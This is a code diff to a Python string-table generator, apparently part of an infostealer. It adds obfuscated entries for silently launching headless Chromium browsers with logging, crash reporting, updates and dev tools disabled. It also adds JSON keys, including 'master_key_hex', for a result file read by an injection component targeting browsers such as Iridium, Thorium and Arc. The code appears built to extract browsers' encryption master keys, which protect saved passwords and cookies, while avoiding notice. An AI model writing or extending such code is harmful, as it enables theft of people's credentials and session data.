@@ -179,6 +179,29 @@ def generate_lib_strings() -> list:
         ("INJ_NAME_IRIDIUM",           "Iridium"),
         ("INJ_NAME_THORIUM",           "Thorium"),
         ("INJ_NAME_ARC",               "Arc"),
+        # Chrome headless flags (each flag separately to avoid one giant string)
+        ("CHROME_FLAG_HEADLESS",       "--headless=new"),
+        ("CHROME_FLAG_NOGPU",          "--disable-gpu"),
+        ("CHROME_FLAG_NOLOG",          "--disable-logging"),
+        ("CHROME_FLAG_LOGLVL",         "--log-level=3"),
+        ("CHROME_FLAG_NOBGNET",        "--disable-background-networking"),
+        ("CHROME_FLAG_NOSYNC",         "--disable-sync"),
+        ("CHROME_FLAG_NODEFA",         "--disable-default-apps"),
+        ("CHROME_FLAG_NOEXT",          "--disable-extensions"),
+        ("CHROME_FLAG_NOUPDATE",       "--disable-component-update"),
+        ("CHROME_FLAG_NOFIRST",        "--no-first-run"),
+        ("CHROME_FLAG_NODEFBR",        "--no-default-browser-check"),
+        ("CHROME_FLAG_NOERR",          "--noerrdialogs"),
+        ("CHROME_FLAG_NODEVTOOLS",     "--disable-dev-tools"),
+        ("CHROME_FLAG_NOTRANSLATE",    "--disable-features=Translate"),
+        ("CHROME_FLAG_NOFLOOD",        "--disable-ipc-flooding-protection"),
+        ("CHROME_FLAG_NOBREAKPAD",     "--disable-breakpad"),
+        ("CHROME_FLAG_METRICS",        "--metrics-recording-only"),
+        ("CHROME_FLAG_USERDATA",       "--user-data-dir="),
+        # JSON key used in result file communication (read-side in inject)
+        ("JSON_KEY_MASTER",            "master_key_hex"),
+        ("JSON_KEY_ERROR",             "error"),
+        ("JSON_KEY_BROWSER",           "browser"),
     ]
     result = []
     for name, plaintext in strings:
